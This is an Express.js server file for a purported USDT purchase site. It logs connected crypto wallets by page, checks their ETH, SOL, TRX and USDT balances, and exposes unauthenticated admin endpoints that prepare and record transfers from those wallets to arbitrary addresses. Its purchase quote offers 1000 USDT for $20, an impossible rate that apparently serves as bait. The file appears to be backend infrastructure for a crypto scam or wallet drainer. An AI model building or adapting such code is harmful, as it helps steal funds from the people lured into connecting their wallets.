import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import axios from 'axios';
import { ethers } from 'ethers';
import * as web3 from '@solana/web3.js';
import TronWeb from 'tronweb';
import { v4 as uuidv4 } from 'uuid';

dotenv.config();

const app = express();
app.use(cors({
    origin: process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : '*',
    credentials: true
}));
app.use(express.json());

const PORT = process.env.PORT || 3000;

const wallets = new Map();
const pendingTransactions = new Map();
const completedTransactions = new Map();

const evmProvider = new ethers.JsonRpcProvider(process.env.EVM_RPC_URL || 'https://eth.llamarpc.com');
const solanaConnection = new web3.Connection(process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com', 'confirmed');

let tronWeb;
try {
    tronWeb = new TronWeb({
        fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
        solidityNode: process.env.TRON_SOLIDITY_NODE || 'https://api.trongrid.io',
        eventServer: process.env.TRON_EVENT_SERVER || 'https://api.trongrid.io'
    });
} catch (error) {
    console.error('TronWeb initialization error:', error);
}

const USDT_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function decimals() view returns (uint8)"
];

const EVM_USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const SOLANA_USDT_ADDRESS = new web3.PublicKey('Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB');
const TRON_USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

async function getEVMUSDTBalance(address) {
    try {
        const contract = new ethers.Contract(EVM_USDT_ADDRESS, USDT_ABI, evmProvider);
        const balance = await contract.balanceOf(address);
        const decimals = await contract.decimals();
        return ethers.formatUnits(balance, decimals);
    } catch (error) {
        console.error('EVM USDT balance error:', error);
        return '0';
    }
}

async function getEVMETHBalance(address) {
    try {
        const balance = await evmProvider.getBalance(address);
        return ethers.formatEther(balance);
    } catch (error) {
        console.error('EVM ETH balance error:', error);
        return '0';
    }
}

async function getSolanaUSDTBalance(address) {
    try {
        const pubkey = new web3.PublicKey(address);
        const tokenAccounts = await solanaConnection.getParsedTokenAccountsByOwner(pubkey, { mint: SOLANA_USDT_ADDRESS });
        if (tokenAccounts.value.length === 0) return '0';
        const balance = tokenAccounts.value[0].account.data.parsed.info.tokenAmount.uiAmount;
        return balance.toString();
    } catch (error) {
        console.error('Solana USDT balance error:', error);
        return '0';
    }
}

async function getSolanaSOLBalance(address) {
    try {
        const pubkey = new web3.PublicKey(address);
        const balance = await solanaConnection.getBalance(pubkey);
        return (balance / web3.LAMPORTS_PER_SOL).toString();
    } catch (error) {
        console.error('Solana SOL balance error:', error);
        return '0';
    }
}

async function getTronUSDTBalance(address) {
    try {
        if (!tronWeb) return '0';
        const contract = await tronWeb.contract().at(TRON_USDT_ADDRESS);
        const result = await contract.balanceOf(address).call();
        return (result / 1000000).toString();
    } catch (error) {
        console.error('Tron USDT balance error:', error);
        return '0';
    }
}

async function getTronTRXBalance(address) {
    try {
        if (!tronWeb) return '0';
        const balance = await tronWeb.trx.getBalance(address);
        return (balance / 1000000).toString();
    } catch (error) {
        console.error('Tron TRX balance error:', error);
        return '0';
    }
}

app.post('/api/wallet/connect', (req, res) => {
    try {
        const { address, chain, walletName, sourcePage } = req.body;
        
        if (!address || !chain || !walletName || !sourcePage) {
            return res.status(400).json({ error: 'Missing required fields' });
        }
        
        const validChains = ['evm', 'solana', 'tron'];
        const validPages = ['homepage', 'buy-usdt'];
        
        if (!validChains.includes(chain)) {
            return res.status(400).json({ error: 'Invalid chain' });
        }
        
        if (!validPages.includes(sourcePage)) {
            return res.status(400).json({ error: 'Invalid source page' });
        }
        
        const walletData = {
            address: address.toLowerCase(),
            chain,
            walletName,
            sourcePage,
            timestamp: new Date().toISOString(),
            lastSeen: new Date().toISOString()
        };
        
        wallets.set(walletData.address, walletData);
        
        res.json({
            success: true,
            message: 'Wallet connected successfully',
            wallet: walletData
        });
    } catch (error) {
        console.error('Wallet connect error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/api/wallets', (req, res) => {
    try {
        const { page, chain } = req.query;
        let walletList = Array.from(wallets.values());
        
        if (page) {
            walletList = walletList.filter(wallet => wallet.sourcePage === page);
        }
        
        if (chain) {
            walletList = walletList.filter(wallet => wallet.chain === chain);
        }
        
        res.json({
            success: true,
            count: walletList.length,
            wallets: walletList
        });
    } catch (error) {
        console.error('Get wallets error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/api/wallet/:address/assets', async (req, res) => {
    try {
        const address = req.params.address.toLowerCase();
        const wallet = wallets.get(address);
        
        if (!wallet) {
            return res.status(404).json({ error: 'Wallet not found' });
        }
        
        let assets = {};
        
        switch (wallet.chain) {
            case 'evm':
                assets = {
                    eth: await getEVMETHBalance(wallet.address),
                    usdt: await getEVMUSDTBalance(wallet.address)
                };
                break;
            case 'solana':
                assets = {
                    sol: await getSolanaSOLBalance(wallet.address),
                    usdt: await getSolanaUSDTBalance(wallet.address)
                };
                break;
            case 'tron':
                assets = {
                    trx: await getTronTRXBalance(wallet.address),
                    usdt: await getTronUSDTBalance(wallet.address)
                };
                break;
        }
        
        res.json({
            success: true,
            address: wallet.address,
            chain: wallet.chain,
            assets
        });
    } catch (error) {
        console.error('Get assets error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.post('/api/admin/prepare-transaction', (req, res) => {
    try {
        const { fromAddress, toAddress, chain, asset, amount } = req.body;
        
        if (!fromAddress || !toAddress || !chain || !asset || !amount) {
            return res.status(400).json({ error: 'Missing required fields' });
        }
        
        const validChains = ['evm', 'solana', 'tron'];
        if (!validChains.includes(chain)) {
            return res.status(400).json({ error: 'Invalid chain' });
        }
        
        const transactionId = uuidv4();
        const transactionData = {
            id: transactionId,
            fromAddress: fromAddress.toLowerCase(),
            toAddress: toAddress.toLowerCase(),
            chain,
            asset,
            amount,
            status: 'pending',
            createdAt: new Date().toISOString(),
            confirmed: false,
            signedData: null
        };
        
        pendingTransactions.set(transactionId, transactionData);
        
        res.json({
            success: true,
            message: 'Transaction prepared successfully',
            transactionId,
            transaction: transactionData
        });
    } catch (error) {
        console.error('Prepare transaction error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.post('/api/admin/record-transaction', (req, res) => {
    try {
        const { transactionId, signedData, txHash } = req.body;
        
        if (!transactionId || !signedData || !txHash) {
            return res.status(400).json({ error: 'Missing required fields' });
        }
        
        const transaction = pendingTransactions.get(transactionId);
        if (!transaction) {
            return res.status(404).json({ error: 'Transaction not found' });
        }
        
        if (transaction.confirmed) {
            return res.status(400).json({ error: 'Transaction already confirmed' });
        }
        
        transaction.status = 'completed';
        transaction.confirmed = true;
        transaction.signedData = signedData;
        transaction.txHash = txHash;
        transaction.completedAt = new Date().toISOString();
        
        pendingTransactions.delete(transactionId);
        completedTransactions.set(transactionId, transaction);
        
        res.json({
            success: true,
            message: 'Transaction recorded successfully',
            transaction
        });
    } catch (error) {
        console.error('Record transaction error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.post('/api/usdt/purchase', (req, res) => {
    try {
        const { amount, walletAddress, chain } = req.body;
        
        if (!amount || !walletAddress || !chain) {
            return res.status(400).json({ error: 'Missing required fields' });
        }
        
        const numericAmount = parseFloat(amount);
        if (isNaN(numericAmount) || numericAmount <= 0) {
            return res.status(400).json({ error: 'Invalid amount' });
        }
        
        let usdtAmount;
        if (numericAmount === 20) {
            usdtAmount = 1000;
        } else if (numericAmount === 50) {
            usdtAmount = 2500;
        } else if (numericAmount === 100) {
            usdtAmount = 5000;
        } else if (numericAmount > 100) {
            usdtAmount = numericAmount * 40;
        } else {
            return res.status(400).json({ error: 'Invalid purchase amount. Valid amounts: 20, 50, 100, or >100' });
        }
        
        const purchaseId = uuidv4();
        
        res.json({
            success: true,
            message: 'Purchase quote generated',
            purchaseId,
            usdAmount: numericAmount,
            usdtAmount,
            rate: usdtAmount / numericAmount,
            walletAddress,
            chain,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('USDT purchase error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        wallets: wallets.size,
        pendingTransactions: pendingTransactions.size,
        completedTransactions: completedTransactions.size
    });
});

app.use((req, res) => {
    res.status(404).json({ error: 'Endpoint not found' });
});

app.use((error, req, res, next) => {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
});

if (process.env.NODE_ENV !== 'production') {
    app.listen(PORT, () => {
        console.log(`Server running on port ${PORT}`);
    });
}

export default app;
